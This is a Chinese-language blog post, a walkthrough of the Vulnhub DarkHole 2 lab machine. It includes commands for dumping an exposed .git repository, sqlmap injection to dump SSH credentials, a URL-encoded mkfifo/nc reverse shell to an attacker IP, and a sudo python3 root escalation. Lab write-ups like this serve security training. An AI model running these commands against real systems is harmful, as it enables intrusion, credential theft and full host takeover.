@@ -1,0 +1,171 @@
+---
+layout: post
+title: DarkHole 2
+subtitle: DarkHole 2
+date: 2023-07-15 15:02
+author: Kyon-H
+header-img: img/post-bg-2015.jpg
+tags:
+  - 靶场实战
+  - Vulnhub
+published: true
+number headings: off
+---
+
+ip 扫描发现主机 `192.168.163.134`
+
+![image.png](https://img.ghostliner.top/gfbKzP.png)
+
+扫描端口
+
+![image.png](https://img.ghostliner.top/92tYeS.png)
+
+目录扫描，发现 `.git` 目录，使用 `GitHack` 下载目录
+
+```shell
+# 下载GitHack
+git clone https://github.com/BugScanTeam/GitHack.git
+cd GitHack
+# 执行
+python2 GitHack.py http://192.168.163.134/.git/
+```
+
+进入到 `.git` 目录查看日志
+
+```shell
+git log
+```
+
+发现有三个版本，第二版本在`login.php`添加了默认凭证
+
+![image.png](https://img.ghostliner.top/3Kf9f3.png)
+
+回退版本
+
+```shell
+git reset --hard HEAD^
+# or
+git reset --hard a4d900a8d85e8938d3601f3cef113ee293028e10
+```
+
+查看 `login.php` 发现用户名：`lush@admin.com` 密码：`321`
+
+![image.png](https://img.ghostliner.top/jPyGeI.png)
+
+使用用户名密码登录成功，登陆后地址： <http://192.168.163.134/dashboard.php?id=1>
+
+查看 `dashboard.php` , 其中 `\155`为 8 进制，`\x6f`为 16 进制
+
+![image.png](https://img.ghostliner.top/rJ7Gcp.png)
+
+解码 query，测试 mobile 参数未发现注入
+
+```sql
+update users set username='{$fname}',email='{$email}',address='{$address}',contact_number='{$mobile}' where id=1
+```
+
+测试 `id`参数是否存在注入
+
+```shell
+sqlmap.py -u http://192.168.163.134/dashboard.php?id=1 --cookie="PHPSESSID=ig59meapmtplquf4uqpl97v8kp" --dbs --batch
+```
+
+获取数据库
+![image.png](https://img.ghostliner.top/LCfuCU.png)
+
+获取表
+
+```shell
+sqlmap.py -u http://192.168.163.134/dashboard.php?id=1 --cookie="PHPSESSID=ig59meapmtplquf4uqpl97v8kp" -D darkhole_2 --tables
+```
+
+![image.png](https://img.ghostliner.top/LoHkow.png)
+
+获取列
+
+```shell
+sqlmap.py -u http://192.168.163.134/dashboard.php?id=1 --cookie="PHPSESSID=ig59meapmtplquf4uqpl97v8kp" -D darkhole_2 --columns
+```
+
+![image.png](https://img.ghostliner.top/Mu8cJ4.png)
+
+获取 ssh 表中数据
+
+```shell
+sqlmap.py -u http://192.168.163.134/dashboard.php?id=1 --cookie="PHPSESSID=ig59meapmtplquf4uqpl97v8kp" -D darkhole_2 -T ssh --dump
+```
+
+![image.png](https://img.ghostliner.top/ij6uhn.png)
+
+用户名：`jehad` 密码：`fool`
+
+ssh 登录成功，查看 home 目录
+
+![image.png](https://img.ghostliner.top/9AbmUV.png)
+
+发现 flag 文件
+
+![image.png](https://img.ghostliner.top/6eDntV.png)
+
+获取到数据库用户名密码
+
+![image.png](https://img.ghostliner.top/QtpOyP.png)
+
+`sudo -l` 提权失败
+![image.png](https://img.ghostliner.top/pbtTKM.png)
+
+```shell
+cat /etc/crontab
+```
+
+发现 losy 定时任务：在本地开放 9999 端口作为站点
+
+![image.png](https://img.ghostliner.top/ZKmacp.png)
+
+查看 `/opt/web` 目录下文件，可知需要构造 get 请求，参数为 `cmd`
+
+![image.png](https://img.ghostliner.top/kXEBsn.png)
+
+测试参数
+
+![image.png](https://img.ghostliner.top/tX4umD.png)
+
+尝试反弹 shell
+
+<mark>使用 nc -e 或 nc -c 都会报错</mark>
+
+```shell
+# mkfifo /tmp/f
+curl http://127.0.0.1:9999?cmd=mkfifo%20%2Ftmp%2Ff
+# echo "cat /tmp/f|/bin/bash -i 2>&1|nc -nv 192.168.163.132 4444 >/tmp/f" >/tmp/tt
+curl http://127.0.0.1:9999?cmd=echo%20%22cat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%20-nv%20192.168.163.132%204444%20%3E%2Ftmp%2Ff%22%20%3E%2Ftmp%2Ftt
+# chmod +x /tmp/tt
+curl http://127.0.0.1:9999?cmd=chmod%20%2Bx%20%2Ftmp%2Ftt
+# /bin/bash /tmp/tt
+curl http://127.0.0.1:9999?cmd=%2Fbin%2Fbash%20%2Ftmp%2Ftt
+```
+
+反弹成功切换为用户 `losy`
+
+![image.png](https://img.ghostliner.top/bfO3pi.png)
+
+查看 `.bash_history` 获取到 losy 用户密码：`gang`
+
+![image.png](https://img.ghostliner.top/3VDxKW.png)
+
+SSH 登录，`sudo -l` 查看是否能提权
+
+![image.png](https://img.ghostliner.top/p1rd3x.png)
+
+使用 python3 提权
+
+```shell
+sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
+```
+
+root 提权成功
+
+![image.png](https://img.ghostliner.top/8Dr4PW.png)
+
+获取到最终 flag 文件
+![image.png](https://img.ghostliner.top/ILL2cW.png)
